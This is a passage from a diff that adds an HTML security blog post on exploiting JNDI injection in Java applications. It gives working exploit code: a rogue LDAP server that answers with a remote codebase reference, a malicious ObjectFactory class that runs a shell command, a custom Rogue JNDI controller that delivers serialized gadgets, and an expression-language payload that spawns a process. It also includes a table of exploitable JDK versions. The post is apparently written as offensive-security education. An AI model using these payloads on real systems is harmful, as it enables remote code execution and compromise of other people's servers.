+            <span style="color: #cf8e6d;">byte</span>[] decodedBytes = <span style="color: #cf8e6d;">Base64</span>.<span style="color: #56a8f5;">getDecoder</span>().<span style="color: #56a8f5;">decode</span>(ser_data);
+
+            <span style="color: #cf8e6d;">ldaptest</span> obj = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ldaptest</span>();
+            
+            <span style="color: #808080;">//Starts the LDAP Server</span>
+            <span style="color: #cf8e6d;">InMemoryDirectoryServer</span> ds = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryDirectoryServer</span>(obj.<span style="color: #56a8f5;">malicousServerEntryAndResponse</span>(decodedBytes));
+            ds.<span style="color: #56a8f5;">startListening</span>();
+            <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"LDAP Server started on port 1389"</span>);
+
+        } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">Exception</span> e) {
+            e.<span style="color: #56a8f5;">printStackTrace</span>();
+        }
+    }
+}</pre></div>
+                </p>
+                </div>
+    </ol>
+    
+</p>
+
+<div><h4>For Remote Class Loading:</h4></div>
+<p>For remote class loading we have to change the malicousServerEntryAndResponse() as below.  </p>
+<p>
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> <span style="color: #56a8f5;">malicousServerEntryAndResponse</span>(<span style="color: #cf8e6d;">byte</span>[] decodedBytes) <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">LDAPException</span> {
+    <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> config = <span style="color: #56a8f5;">serverConfiguration</span>();
+
+    <span style="color: #808080;">//Intercepting the Call and sending Malicious Response</span>
+    config.<span style="color: #56a8f5;">addInMemoryOperationInterceptor</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryOperationInterceptor</span>() {
+        <span style="color: #bbb529;">@Override</span>
+        <span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">void</span> <span style="color: #56a8f5;">processSearchResult</span>(<span style="color: #cf8e6d;">InMemoryInterceptedSearchResult</span> result) {
+            <span style="color: #cf8e6d;">ReadOnlySearchRequest</span> request = result.<span style="color: #56a8f5;">getRequest</span>();
+            <span style="color: #cf8e6d;">if</span> (request.<span style="color: #56a8f5;">getBaseDN</span>().<span style="color: #56a8f5;">toString</span>().<span style="color: #56a8f5;">equalsIgnoreCase</span>(<span style="color: #6aab73;">"o=custom"</span>)) {
+                <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"Inside Malicious EntryFunction() on custom thing"</span>);
+                <span style="color: #cf8e6d;">Entry</span> entry = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Entry</span>(<span style="color: #6aab73;">"o=custom"</span>);
+                entry.<span style="color: #56a8f5;">addAttribute</span>(<span style="color: #6aab73;">"objectClass"</span>, <span style="color: #6aab73;">"javaNamingReference"</span>);
+                entry.<span style="color: #56a8f5;">addAttribute</span>(<span style="color: #6aab73;">"javaClassName"</span>, <span style="color: #6aab73;">"java.lang.String"</span>); <span style="color: #808080;">//could be any unknown</span>
+                entry.<span style="color: #56a8f5;">addAttribute</span>(<span style="color: #6aab73;">"javaFactory"</span>, <span style="color: #6aab73;">"testObject"</span>); <span style="color: #808080;">//could be any unknown</span>
+                entry.<span style="color: #56a8f5;">addAttribute</span>(<span style="color: #6aab73;">"javaCodebase"</span>, <span style="color: #6aab73;">"http://localhost:9004/"</span>);
+                <span style="color: #808080;">//entry.addAttribute("javaSerializedData", decodedBytes);</span>
+                <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"service Response"</span>);
+                <span style="color: #cf8e6d;">try</span> {
+                    result.<span style="color: #56a8f5;">sendSearchEntry</span>(entry);
+                    result.<span style="color: #56a8f5;">setResult</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">LDAPResult</span>(<span style="color: #b3ae60;">0</span>, <span style="color: #cf8e6d;">ResultCode</span>.SUCCESS));
+                } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">LDAPException</span> e) {
+                    e.<span style="color: #56a8f5;">printStackTrace</span>();
+                }
+            } <span style="color: #cf8e6d;">else</span> {
+                result.<span style="color: #56a8f5;">setResult</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">LDAPResult</span>(<span style="color: #b3ae60;">0</span>, <span style="color: #cf8e6d;">ResultCode</span>.NO_SUCH_OBJECT));
+            }
+        }
+    });
+
+    <span style="color: #cf8e6d;">return</span> config;
+}</pre></div>
+</p>
+<p>
+    we have added 4 new entires and removed the javaSerializedData attribute.
+    <ol>
+        <li>objectClass="javaNamingReference"</li>
+        <li>javaClassName="java.lang.String" //could be any unknown</li>
+        <li>javaFactory="testObject" //could be any unknown</li>
+        <li>javaCodebase= "http://localhost:9004/"</li>
+                            
+    </ol>
+</p>
+<p> Now the Vulnerable application is going to fetch the http://localhost:9004/testObject.class</p>
+<p>So you need to have testObject.class ready On your server</p>
+<p>The testObject class should implement  javax.naming.spi.ObjectFactory and should override the getObjectInstance()</p>
+<p>The code you want to execute should be inside the default constructor.</p>
+
+<p>In short the testObject.class code should look like below</p>
+<p>
+    <code>
+        <pre>
+import java.lang.*;
+import javax.naming.Context;
+import javax.naming.Name;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+import java.util.Hashtable;
+public class testObject implements javax.naming.spi.ObjectFactory
+{
+    public testObject()
+    {
+        try{
+        Runtime.getRuntime().exec("touch /tmp/pwnedViaRemoteReference");
+    }catch(Exception e)
+    {
+        e.printStackTrace();
+    }
+}
+@Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
+        return null;
+    }
+}
+        </pre>
+    </code>
+</p>
+
+<h3 style="text-align: left;">Modifying Existing Tools</h3>
+<div>
+    <p>Although it is not difficult to build your own malicious server , it is often easier to modify the exsting tools to  fullfill your exploitation Requirements. </p>
+</div>
+<div><p>So lets analyse how to modify some existing tools such as <a href="https://github.com/veracode-research/rogue-jndi">Rogue JNDI server From Veracode</a></p></div>
+<p>Lets take WebSphere1.java to understand how to build our own LDAP Mapper where we can add our own gadget</p>
+<div>
+    If you see there few thing on the webSphere1.java
+    <ol>
+        <li>A Custom Annotation @LdapMapping</li>
+        This attribute takes the url, which is like the input the vulnerable application is either going to lookup() or search() for.
+        <li>The Class implements LDAPController and the sendReuslt Function takes InMemoryInterceptedSearchResult as input</li>
+        This result is then used to send the response back to the user
+        <li>Inside the sendResult() we see 2 key things
+            <ul>
+                <li><code><pre>e.addAttribute("javaClassName", "java.lang.String");</pre></code></li>
+                <li><code><pre>e.addAttribute("javaSerializedData", serialize(ref));</pre></code></li>
+            </ul>
+        </li>
+        <p>The rest are the gadget used(WebSphere1 gadget).</p>
+        <p>javaSerializedData is being used to send the serialize ref which === Sending the serialized gadget data.</p>
+        
+    </ol>
+</div>
+<p>
+    So assuming we do not have any well known gadget in the class path and we have to custom make our gadget and want to integrate it with the above ldap server , we can follow below steps.
+</p>
+<ul>
+    <li>
+        Create a file called custom.java under the controller directory.
+    </li>
+    <li>
+        Copy paste the below code
+        <code>
+            <pre>
+                package artsploit.controllers;
+                import artsploit.annotations.LdapMapping;
+                import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+                import com.unboundid.ldap.sdk.Entry;
+                import com.unboundid.ldap.sdk.LDAPResult;
+                import com.unboundid.ldap.sdk.ResultCode;
+                import java.util.Base64;
+                @LdapMapping(uri = { "/o=custom"})
+                public class custom implements LdapController {
+                
+                    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
+                        Entry e = new Entry(base);
+                        System.out.println(base);
+                        e.addAttribute("javaClassName", "java.lang.String"); //could be anything
+                        String ser_data="base64 encoded serialized Gadget Data";
+                        byte[] decodedBytes = Base64.getDecoder().decode(ser_data);
+                        e.addAttribute("javaSerializedData",decodedBytes );
+                        System.out.println("Data sent");
+                    
+                        result.sendSearchEntry(e);
+                        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+                    }
+                }
+
+            </pre>
+        </code>
+    </li>
+    <li>Recomplie the Application
+        <code><pre>mvn clean package</pre></code>
+    </li>
+</ul>
+<p>Now you can see that our custom mapper is ready to exploit.</p>
+<p><img src="images/jndiInjection/CustomRogueJNDICode.PNG"></p>
+
+<h2 style="text-align: left;">Bonus</h3>
+<h3 style="text-align: left;">Beyond Java 8:</h3>
+        <p>So currently there are JDK versions till 21.</p>
+        <p>The above discussed Techniques differs from JDK versions to versions</p>
+        <p>Checkout the table below.</p>
+        <table class="tg"><thead>
+            <tr>
+              <th class="tg-0lax">Exploit Technique</th>
+              <th class="tg-0lax">JDK Version Range</th>
+              <th class="tg-0lax">Impact</th>
+            </tr></thead>
+          <tbody>
+            <tr>
+              <td class="tg-0lax">Remote Class Loading</td>
+              <td class="tg-0lax">JDK <8u121</td>
+              <td class="tg-0lax">works</td>
+            </tr>
+            <tr>
+              <td class="tg-0lax">Using Third party Gadgets</td>
+              <td class="tg-0lax">JDK <=19 </td>
+              <td class="tg-0lax">works</td>
+            </tr>
+            <tr>
+                <td class="tg-0lax">Tomcat Gadget</td>
+                <td class="tg-0lax">JDK <=14 </td>
+                <td class="tg-0lax">works</td>
+              </tr>
+          </tbody>
+          </table>
+<div>
+    <p>
+        But what about JDK 14 to 19 , why tomcat gadget will not work there?
+    </p>
+    <p> To answer the above question lets take a close into the gadget</p>
+    <p>The gagdet uses the javax.el.ELProcessor.eval() to execute an expression language written on the payload variable.</p>
+    <p>This expression language uses ScriptEngine which is not available after JDK 14 (nashorm script engine is absent).</p>
+    <p>And hence the expression language never succeeds to give us a shell</p>
+    <p>Chaning the expression language on the payload variable to below will give you code execution.</p>
+    <p>
+        <code>
+            <pre>
+                {''.getClass().forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance(['calc.exe']).start()}
+            </pre>
+        </code>
+    </p>
+    <p>The above code will pop a calculator.If you application is in a linux env you have change the binary accordingly.</p>
+</div>
+<div>
+    <h3>Restrictions from JDK 20 To 22</h3>
+    <p>on JDK above 19 i.e from JDK version 20 Onwards we can not even use the Thrid Party Gadgets(Such as gadgets available on ysoserial) because the Deserialisation from Java naming apis are blocked by default.</p>
+    <p>Let's take a look into the below code to understand why</p>
+    <p>If you try to exploit on JDK above 19 you will see the below stack trace</p>
+    <p>
+        <img src="images/jndiInjection/jdkabove19.PNG">
+    </p>
+    <p>Lets examine the code from Obj.java</p>
+    <p>Backtracking the code we see the Code have a if else condition which checks for if serialData is allowed</p>
+    <p><img src="images/jndiInjection/objjava.PNG"></p>
+    <p>Lets check the VersionHelper.java</p>
+    <p><img src="images/jndiInjection/isserallowed.PNG"></p>
+    <p><img src="images/jndiInjection/defaultserial.PNG"></p>
+    <p>As you can see above,  the default value of the trustSerialData is set to false which is responsible for allowing the JDK to deserilize the data</p>
+    <p>So unless the target application is not explicitly setting the value of this system property to True , the exploitation is not possible.</p>
+    <p>So if the target app is using JDK version higher than 19, its a good idea to check if this property being explicitly set somewhere</p>
+
+    <p>Similary even if the application is using JDK version less than 19 you may not be able to exploit it if the application is explicitly setting this value to false.</p>
+</div>
+<div>
+    <p></p>
+</div>
+<br>
+<br>
+<p><b>Thats it For this Blog.</b></p>
+<p><b>Thanks For Reading.</b></p>
+<p><b>Happy Hacking.</b></p>
+<p><b>You can connect with me at:</b></p>
+<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
+<p><a href="https://x.com/webspl01t3r">Twitter</a></p>
+
+  </main>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <span>&copy; 2025 ZDaylabs. We exploit, analyze, and document.</span>
+    <nav class="footer-links" aria-label="Footer">
+      <a href="research.html">Research</a>
+      <a href="blogs.html">Blogs</a>
+      <a href="policy.html">Disclosure policy</a>
+      <a href="https://github.com/w3bspl01t3r" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </nav>
+  </div>
+</footer>
+<script src="navigation.js" defer></script>
+</body>
+</html>
